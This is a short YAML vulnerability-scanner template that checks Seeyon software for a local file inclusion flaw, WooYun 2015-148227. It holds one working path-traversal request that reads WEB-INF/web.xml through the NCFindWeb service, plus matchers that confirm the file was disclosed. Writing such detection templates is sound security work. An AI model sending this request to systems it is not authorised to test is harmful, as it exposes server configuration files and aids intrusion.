id: wooyun-2015-148227
name: Seeyon WooYun - Local File Inclusion
severity: high
confidence: tentative
description: Seeyon WooYun allows remote attackers to include the content of locally stored content and disclose it back to
  the attacker via local file inclusion.
reference: CWE-22
tags:
- seeyon
- wooyun
- lfi
- zhiyuan
- vuln
requests:
- method: GET
  path: /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
  matchers:
  - type: status
    status:
    - 200
  - type: body
    words:
    - <servlet-name>NCInvokerServlet</servlet-name>
  - type: header
    words:
    - application/xml
  condition: and
